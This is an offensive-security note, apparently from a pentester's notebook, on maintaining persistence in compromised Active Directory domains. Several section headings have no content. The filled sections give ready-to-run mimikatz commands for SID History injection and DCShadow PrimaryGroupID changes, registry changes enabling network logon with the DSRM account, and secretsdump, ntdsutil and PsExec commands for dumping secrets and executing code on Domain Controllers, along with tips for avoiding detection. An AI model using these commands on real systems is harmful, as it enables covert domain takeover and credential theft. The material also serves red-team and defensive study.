# Active Directory - Persistence

### Kerberos "golden" / "silver" tickets

### SID History

The access to securable resources, that is resources that define a `security
descriptor`, is based on the `security principal`'s (user or machine account
and security group notably) `SID`, eventual extra `SIDs`, and `security group
SIDs`. Indeed, these `SIDs` are compared to the access rights defined in the
`Access Control Entries (ACEs)` of the accessed object's `Discretionary Access
Control List (DACL)`.

Adding a privileged `SID`, such as the one of the built-in domain Administrator
account (`SID` `S-1-5-21-<DOMAIN>-500`), in the `SID History` of a non
privileged user can thus be leveraged to maintain persistence in the domain
through a seemingly standard user. In order to avoid detection, a non built-in
user (`RID` > 1000) member of a privileged group (`Enterprise Admins`, `Domain
Admins`, `Administrators`, etc.) may be preferred. The persistence will be
operational until the impersonated user is deleted or removed from the
privileged group(s).

Under normal circumstances, `SIDs` will only be added (automatically) to the
`SIDHistory` attribute of a security principal during domain migration and
cannot be manually added (but can be manually removed).

This restriction can be bypassed and `SIDs` added to a `security principal`'s
`SIDHistory` attribute with `mimikatz` by either:
  - executing code locally on a Domain Controller to patch its `NTDS` service
  - registering a rogue Domain Controller to inject and replicate arbitrary
    modifications (attack known as `DCShadow`)

The following command can be used to validate the `SIDHistory` attribute
modification:

```    
Get-ADObject -Filter "(SamAccountName -eq '<SAMACCOUNTNAME>')" -Properties SIDHistory
```

###### SID History modification through local patch of the NTDS service

This technique of modification of the `SIDHistory` attribute requires
privileges granted to the `Domain Admins` group and must be conducted on a
Domain Controller as the `Windows NT Directory Services (NTDS)` service must be
locally patched. While the `SID History` modification will persist, the `NTDS`
service patch will not be persistent across reboot of the Domain Controller.

`mimikatz`'s `sid` module can be used to add `SIDs` in the `SIDHistory`
attribute of any users of the current domain (the following commands must be
executed directly on a Domain Controller):

```
# If necessary, elevate privileges to "NT AUTHORITY\SYSTEM" and enables the "SeDebugPrivilege" privilege.
mimikatz # token::elevate
mimikatz # privilege::debug

# Patches the ntds service.
# Only the first patch ("Patch 1/2 ntds service patched") is required for the attack (the second patch may rise an error, such as "ERROR kull_m_patch_genericProcessOrServiceFromBuild", with out incidence).
mimikatz # sid::patch

# Adds the given SID in the SIDHistory attribute of the specified user.
# For example, S-1-5-21-<DOMAIN>-500 for built-in domain Administrator account.
mimikatz # sid::add /sam:<SAMACCOUNTNAME> /new:<S-1-5-21-<FOREST_DOMAIN>-519 | EXTRA_SID>
```

###### SID History modification through DCShadow

The restriction on the modification of the `SIDHistory` attribute can be also
bypassed through a `DCShadow` attack to arbitrarily set an account `SIDHistory`
attribute. For more details on the `DCShadow` attack, refer to the
"DCShadow ACL" section of this note.

**This technique will override any `SID(s)` currently present in the `security
principal`'s `SIDHistory` attribute.**

```
# Two mimikatz interpreters (executed on a machine member of the domain) are required for the DCShadow attack:
# One running as "NT AUTHORITY\SYSTEM", the second as a domain user with enough privileges to conducted the DCShadow attack (usually a "Domain Admins").
# The following mimikatz commands must be executed sequentially (the /push must be done after the operation as been entered).

# First interpreter (executed as "NT AUTHORITY\SYSTEM").
mimikatz # lsadump::dcshadow /object:<USERNAME> /attribute:SIDHistory /value:<S-1-5-21-<FOREST_DOMAIN>-519 | SID>

# Second interpreter (executed as the privileged domain account).
mimikatz # lsadump::dcshadow /push
```

### PrimaryGroupID

The `PrimaryGroupID` attribute of an user or machine account contains the
`Relative IDentifier (RID)` of a domain group and gives an implicit membership
to the specified group. The `PrimaryGroupID` attribute is used to support
integration of `UNIX POSIX` clients but is not otherwise specifically used
in `Active Directory`.  

The group membership granted by the `PrimaryGroupID` attribute does not appear
in the account's `MemberOf` nor in the group's `Members` `LDAP` attributes. It
will however be included in `constructed attributes` "constructed" through
Microsoft APIs (such as group membership returned by the `Active Directory`
PowerShell module, `MMC`'s snappins, the `net` utility, etc.). It can thus be
used, to a certain extent, to dissimulate membership of a standard account to a
privileged group.

In `kerberos` authentication, the `PrimaryGroupID` attribute of an account
populate the account's `kerberos` tickets `_KERB_VALIDATION_INFO`'s
`PrimaryGroupId` and `GroupIds` fields (in the tickets' `Privilege Attribute
Certificate (PAC)`).

Depending on the account type, the account's `PrimaryGroupID` attribute takes
a different default value:

| Account type | PrimaryGroupID | Corresponding group |
|--------------|----------------|---------------------|
| User account | `513` | `Domain Users` |
| `Guest` account | `514` | `Domain Guests` |
| Machine account | `515` | `Domain Computers` |
| Domain Controllers machine account | `516 ` | `Domain Controllers` |
| Read Only Domain Controllers machine account | `521 ` | `Read-only Domain Controllers` |

Under normal circumstances, the account must be a member of the group specified
in its `PrimaryGroupID` attribute. An error indeed occurs whenever trying to
set the `PrimaryGroupID` attribute of an account to the `RID` of a group the
account is a not a member of (error: "The specified user account is a not a
member of the specified group account"). A similar error occurs whenever
attempting to remove an account from the group set in its `PrimaryGroupID`
(error: "The primary group cannot be removed. Set another group as primary if
you want to remove this one".)

The restriction of membership can be bypassed through a `DCShadow` attack to
arbitrarily set an account `PrimaryGroupID` attribute. For more details on the
`DCShadow` attack, refer to the "DCShadow ACL" section of this note.

```
# Two mimikatz interpreters (executed on a machine member of the domain) are required for the DCShadow attack:
# One running as "NT AUTHORITY\SYSTEM", the second as a domain user with enough privileges to conducted the DCShadow attack (usually a "Domain Admins").
# The following mimikatz commands must be executed sequentially (the /push must be done after the operation as been entered).

# First interpreter (executed as "NT AUTHORITY\SYSTEM").
mimikatz # lsadump::dcshadow /object:<USERNAME> /attribute:PrimaryGroupID /value:<512 | 519 | GROUP_RID>

# Second interpreter (executed as the privileged domain account).
mimikatz # lsadump::dcshadow /push
```

The following command can be used to validate the `PrimaryGroupID` attribute
modification:

```    
Get-ADObject -Filter "(SamAccountName -eq '<SAMACCOUNTNAME>')" -Properties PrimaryGroupID
```

### AdminSDHolder ACL

### DCShadow ACL

Make sure that the local Firewall policy allows inbound connection on the
dynamic TCP ports range.

```
# Two mimikatz interpreters are required for the DCShadow attack (as implemented by mimikatz).
# The following mimikatz commands must be executed sequentially (the /push must be done after the operation as been entered).

# The first interpreter must be executed as "NT AUTHORITY\SYSTEM" and will be used to define the modification.
# PsExec can be used to elevate from local Administrator to "NT AUTHORITY\SYSTEM":
PsExec64.exe -accepteula -s -i cmd.exe
mimikatz # lsadump::dcshadow /object:<USERNAME> /attribute:PrimaryGroupID /value=<512 | 519 | GROUP_RID>

# The second interpreter must be executed as a domain user with enough privileges to conducted the DCShadow attack (by default a member of the "Domain Admins" group).
# runas can be used to execute a process under the identity of the specified account for remote access only:
runas /NetOnly /user:<DOMAIN>\<USERNAME> cmd.exe
mimikatz # lsadump::dcshadow /push
```

### Directory Services Restore Mode account

The `Directory Services Restore Mode (DSRM)` account correspond to the local
built-in `Administrator` (username language dependent name, `SID`
`S-1-5-21-<DC_SPECIFIC>-500`) of a Domain Controller. The `DRSM` account
password is specific to each Domain Controller and is setup during the Domain
Controller promulgation. The `DRSM` accounts are local to each Domain
Controller and have no link with the built-in `Administrator` (`SID`
`S-1-5-21-<DOMAIN>-500`) of the domain.    

Note that since `Windows Server 2008` (`KB961320`), the `DSRM` account password
can be one-time synchronized with a domain account (further synchronization are
however not automated and must be done manually).

The usage of the `DSRM` account is controlled by the `DsrmAdminLogonBehavior`
registry key:

| Value | Description |
|-------|-------------|
| `0x0` <br><br> `Undefined` | The `DSRM` account can only be used if the Domain Controller is booted in `DSRM`. <br><br> `bcdedit /set safeboot dsrepair` <br> `shutdown /r /f /t 5` |
| `0x1` | The `DSRM` account can login on the Domain Controller if the `Active Directory Domain Service (AD DS)` of the Domain Controller are (locally) stopped. |
| `0x2` | The `DSRM` account can login with out any restriction. |

By default, the `DsrmAdminLogonBehavior` key is undefined (and thus the `DSRM`
account can only be used to connect to the Domain Controller if it has been
restarted in `DSRM`).

To maintain persistence after a compromise of an Active Directory domain, the
local built-in `Administrator` password of a Domain Controller can be retrieved
(or set) and the `DsrmAdminLogonBehavior` of the Domain Controller set to
`0x2`. The `DSRM` account will be usable over the network even if the Domain
Controller is not started in `DSRM` and persistence maintained until its
password is renewed. In this scenario, the `DSRM` account can notably be used
to remotely connect to the Domain Controller or conduct replication operations
(`DCSync` attack).  

The following commands can be used to retrieve and set the value of the
`DsrmAdminLogonBehavior` registry key (on a Domain Controller):

```
# Retrieves the current value of the DsrmAdminLogonBehavior registry key.
reg query "HKLM\System\CurrentControlSet\Control\Lsa\" /v "DsrmAdminLogonBehavior"
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -Name "DsrmAdminLogonBehavior"

# Creates and sets the value of the DsrmAdminLogonBehavior registry key to the specified value.
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t "REG_DWORD" /d "<2 | VALUE>"
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -PropertyType DWORD -Value <2 | VALUE>

# Overrides the value of the DsrmAdminLogonBehavior registry key to the specified value (if the key already exists).
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /f /v "DsrmAdminLogonBehavior" /t "REG_DWORD" /d "<2 | VALUE>"
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value "<2 | VALUE>"
```

The following techniques can be used to retrieve or set the `DRSM` account
password:

```
# Remote extraction of the DRSM account (full dump of the local accounts stored in the SAM registry hive).
# For more information and techniques on how to retrieve the local Administrator NTLM hash from the SAM database, refer to the "[Windows] Post Exploitation" note.
secretsdump.py '<DOMAIN>/<USERNAME>[:<PASSWORD>]@<DC_HOSTNAME | DC_IP>'

# While not recommended from an opsec standpoint, the DRSM account password can also be reset (with out requiring knowledge of the current password).
ntdsutil
> set dsrm password
# "null" if the commands are executed locally on the Domain Controller of which the DRSM account password should be updated, its hostname otherwise.
> reset password on server <null | DC_HOSTNAME>
> <NEW_DRSM_PASSWORD>
> <NEW_DRSM_PASSWORD>
```

If the `DsrmAdminLogonBehavior` key of the targeted Domain Controller is set to
`0x2`, remote code execution or replication operations can be conducted using
the `DRSM` account:

```
# Refer to the "[ActiveDirectory] ntds.dit dumping" for more techniques to extract the secrets from the ntds.dit database.
secretsdump.py '<DC_HOSTNAME>/<Administrator | DRSM_ACCOUNT>:<DSRM_PASSWORD>@<DC_HOSTNAME | DC_IP>'
secretsdump.py -hashes <:DSRM_NTLM_HASH> '<DC_HOSTNAME>/<Administrator | DRSM_ACCOUNT>@<DC_HOSTNAME | DC_IP>'

# The DRSM account can be used through any authentication types (network logon, remote interactive logon, etc.).
# Refer to the "[Windows] Lateral movements" note for more techniques to remotely execute code on the targeted Domain Controller (through PsExec-like tools, WMI, WinRM, RDP, etc.).
PsExec.exe -accepteula \\<DC_HOSTNAME | DC_IP> -u "<DC_HOSTNAME>/<Administrator | DRSM_ACCOUNT>" -p "<DRSM_PASSWORD>" -s <cmd.exe | %ComSpec% | powershell.exe>
```

### Kerberos delegations

### Certificates (`User-Principal-Name` or `Alt-Security-Identities`)

### Skeleton key

### Domain Controller local persistence
